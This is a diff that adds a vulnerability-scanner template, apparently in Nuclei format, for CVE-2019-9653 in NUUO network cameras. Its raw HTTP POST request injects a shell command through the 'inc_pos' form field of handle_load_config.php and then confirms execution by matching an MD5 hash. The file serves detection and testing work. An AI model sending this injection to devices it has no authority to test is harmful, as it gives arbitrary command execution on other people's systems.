@@ -1,0 +1,40 @@
+id: cve-2019-9653
+info:
+  name: NUUO Network Camera Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    NUUO network camera has a command execution vulnerability in the `handle_load_config.php` endpoint. Exploiting this vulnerability allows attackers to execute arbitrary commands on the server, potentially compromising the entire web server.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9653
+    - https://github.com/grayoneday/CVE-2019-9653
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2019-9653
+
+variables:
+  boundary: "{{rand_base(8)}}"
+  randStr: "{{rand_base(4)}}"
+  chkStr: "{{md5(randStr)}}"
+
+http:
+  - raw:
+      - |
+        POST /handle_load_config.php HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}\r
+        Content-Disposition: form-data; name="inc_pos"\r\n\r\n        yes'&&echo -n {{randStr}} | md5sum||'\r\n        ------{{boundary}}\r
+        Content-Disposition: form-data; name="upload_file"; filename="configuration.cfg"\r\n        Content-Type: application/octet-stream\r\n        ------{{boundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{chkStr}}"
+        part: body
